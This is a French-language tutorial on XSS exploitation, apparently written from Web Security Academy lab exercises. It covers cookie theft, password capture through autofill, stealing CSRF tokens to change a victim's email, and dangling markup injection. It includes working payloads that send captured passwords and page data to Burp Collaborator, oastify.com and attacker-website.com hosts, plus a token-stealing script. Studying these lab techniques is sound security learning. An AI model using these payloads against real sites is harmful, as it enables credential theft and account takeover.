## Voler des cookies

Le vol de cookies est une méthode traditionnelle d'exploitation des attaques XSS. La plupart des applications web utilisent des cookies pour la gestion des sessions. Vous pouvez exploiter les vulnérabilités de script intersite pour envoyer les cookies de la victime vers votre propre domaine, puis les injecter manuellement dans le navigateur et usurper l'identité de la victime.

## Capturer les mots de passe

De nos jours, de nombreux utilisateurs disposent de gestionnaires de mots de passe qui saisissent automatiquement leurs mots de passe. Vous pouvez en tirer parti en créant un mot de passe, en lisant le mot de passe saisi automatiquement et en l'envoyant à votre propre domaine. Cette technique évite la plupart des problèmes liés au vol de cookies et permet même d'accéder à tous les autres comptes où la victime a réutilisé le même mot de passe.

Le principal inconvénient de cette technique est qu'elle ne fonctionne que pour les utilisateurs disposant d'un gestionnaire de mots de passe avec saisie automatique.

```html
<input hidden name=username id=username>
<input hidden type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## Contourner les protections CSRF

Les attaques XSS permettent à un attaquant d'effectuer quasiment tout ce qu'un utilisateur légitime peut faire sur un site web. En exécutant du code JavaScript arbitraire dans le navigateur de la victime, les attaques XSS vous permettent d'effectuer un large éventail d'actions comme si vous étiez l'utilisateur victime. Par exemple, vous pouvez lui demander d'envoyer un message, d'accepter une demande d'ami, de créer une porte dérobée vers un dépôt de code source ou de transférer des bitcoins.

Certains sites web permettent aux utilisateurs connectés de modifier leur adresse e-mail sans avoir à ressaisir leur mot de passe. Si vous avez détecté une vulnérabilité XSS sur l'un de ces sites, vous pouvez l'exploiter pour voler un jeton CSRF. Grâce à ce jeton, vous pouvez modifier l'adresse e-mail de la victime pour en choisir une que vous contrôlez. Vous pouvez ensuite déclencher une réinitialisation du mot de passe pour accéder au compte.

Ce type d'exploit combine XSS (pour voler le jeton CSRF) avec la fonctionnalité généralement ciblée par CSRF. Alors que le CSRF traditionnel est une vulnérabilité « unidirectionnelle », où l'attaquant peut inciter la victime à envoyer des requêtes sans voir les réponses, XSS permet une communication « bidirectionnelle ». Cela permet à l'attaquant d'envoyer des requêtes arbitraires et de lire les réponses, créant ainsi une attaque hybride qui contourne les défenses anti-CSRF.

> Les jetons CSRF sont inefficaces contre XSS car XSS permet aux attaquants de lire les valeurs des jetons directement à partir des réponses.


```html
<script>
	var req = new XMLHttpRequest();
	req.onload = handleResponse;
	req.open('get','/my-account',true);
	req.send();
	function handleResponse() {
	    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	    var changeReq = new XMLHttpRequest();
	    changeReq.open('post', '/my-account/change-email', true);
	    changeReq.send('csrf='+token+'&email=test@test.com')
	};
</script>
```

```html
<script>
var req = new XMLHttpRequest();                     // 1. Crée un objet requête HTTP
req.onload = handleResponse;                        // 2. Quand la réponse arrive, appelle la fonction handleResponse
req.open('get','/my-account',true);                 // 3. Prépare une requête GET vers "/my-account"
req.send();                                         // 4. Envoie la requête

function handleResponse() {
    // 5. Cherche dans la réponse HTML un champ caché avec le token CSRF
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];

    // 6. Crée une nouvelle requête HTTP pour changer l'email
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);

    // 7. Envoie le formulaire avec le token CSRF récupéré + un nouvel email
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Cela obligera toute personne qui consulte le commentaire à envoyer une demande POST pour modifier son adresse e-mail. `test@test.com`.


## Injection de balisage suspendu
> Dangling markup injection

est une technique permettant de capturer des données inter-domaines dans des situations où une attaque de XSS complète n'est pas possible.

```html
"><img src='//attacker-website.com?
```

Cette charge utile crée une balise `img` et définit le début d'un attribut `src` contenant une URL sur le serveur de l'attaquant. Notez que la charge utile de l'attaquant ne ferme pas l'attribut `src` laissé en suspens.

Lorsqu'un navigateur analyse la réponse, il recherche un guillemet simple pour terminer l'attribut. Tout ce qui précède est traité comme faisant partie de l'URL et est envoyé au serveur de l'attaquant dans la chaîne de requête. Tous les caractères non alphanumériques, y compris les retours à la ligne, sont codés en URL.

L'attaque permet à l'attaquant de capturer une partie de la réponse de l'application après le point d'injection, qui peut contenir des données sensibles. Selon les fonctionnalités de l'application, il peut s'agir de jetons CSRF, d'e-mails ou de données financières.

Tout attribut qui effectue une demande externe peut être utilisé pour le balisage suspendu.

```html
"><a href="https://exploit-0a0300ac035828cb82ae507b01dc00cd.exploit-server.net/exploit">Click me</a><base target='';
```

```html
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

```html
<script>
if(window.name) {
		new Image().src='https://a4fi319gzs2w28xn2cgtvzyv9mfd3ir7.oastify.com?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://0a9b000303d528fc82ff51d700b100c5.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a0300ac035828cb82ae507b01dc00cd.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```
